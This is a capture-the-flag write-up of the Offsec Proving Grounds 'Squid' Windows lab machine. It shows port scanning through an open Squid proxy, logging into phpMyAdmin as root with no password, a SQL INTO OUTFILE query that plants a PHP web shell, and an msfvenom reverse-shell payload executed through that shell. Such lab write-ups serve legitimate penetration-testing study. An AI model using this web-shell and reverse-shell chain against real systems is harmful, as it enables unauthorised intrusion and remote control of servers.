---
title: "Proving grounds Practice: Squid"
layout: post
date: 2023-08-20 06:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Windows
- Pg-Practice
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds practice windows machine writeup"
---
## Nmap

```sh
PORT     STATE SERVICE    VERSION
3128/tcp open  http-proxy Squid http proxy 4.14
|_http-server-header: squid/4.14
|_http-title: ERROR: The requested URL could not be retrieved
```

Squid http proxy service running on PORT 3128. Use [Squid Pivoting Open Port Scanner](https://github.com/aancw/spose) to perform PORT scanning.

![img](/assets/images/CTF/Proving_Grounds/Squid/pscan.png)

Configure the proxy `server IP` and `PORT` in the browser to access the webserver running on PORT 8080.

![img](/assets/images/CTF/Proving_Grounds/Squid/8080.png)

**System Information**

![img](/assets/images/CTF/Proving_Grounds/Squid/sysinfo.png)

**PHPMyadmin**

![img](/assets/images/CTF/Proving_Grounds/Squid/myadmin.png)

Login with username `root` and password as `null`.

Execute below sql query to create reverse shell.

```sql
SELECT "<?php system($_GET['cmd'])?>" INTO OUTFILE "C:/wamp/www/shell2.php"
```

As shown in the phpinfo() page the document root folder is `C:/wamp/www`. So the shell will be publicly accessible at `http://192.168.237.189:8080/shell2.php`.

## Remote Code Execution

```text
http://192.168.237.189:8080/shell2.php?cmd=whoami
```

![img](/assets/images/CTF/Proving_Grounds/Squid/if.png)

## Obtain Stable Shell using msfvenom

```sh
msfvenom -f exe -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=1234 -o mshell.exe
```

Use curl to download the shell in to the attacking machine. Run a `nc` llisterner and execute the reverse shell by visiting `http://192.168.237.189:8080/shell2.php?cmd=mshell.exe`

![img](/assets/images/CTF/Proving_Grounds/Squid/rshell.png)

Reverse shell obtained.

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).